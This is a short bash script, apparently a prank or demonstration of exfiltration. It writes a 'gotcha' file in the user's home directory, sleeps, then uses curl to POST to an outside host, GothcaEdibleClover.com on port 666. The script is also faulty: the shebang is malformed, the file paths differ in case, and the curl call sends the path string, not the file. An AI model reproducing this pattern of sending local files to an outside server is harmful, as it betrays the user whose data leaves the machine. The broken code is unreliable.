/bin/bash

echo "gotcha :)" >> ~/documents/gotcha.txt

sleep 5

curl -i -X POST GothcaEdibleClover.com:666 \
  -H "Content-Type: text/xml" \
  --data-binary "~/Documents/gotcha.txt"
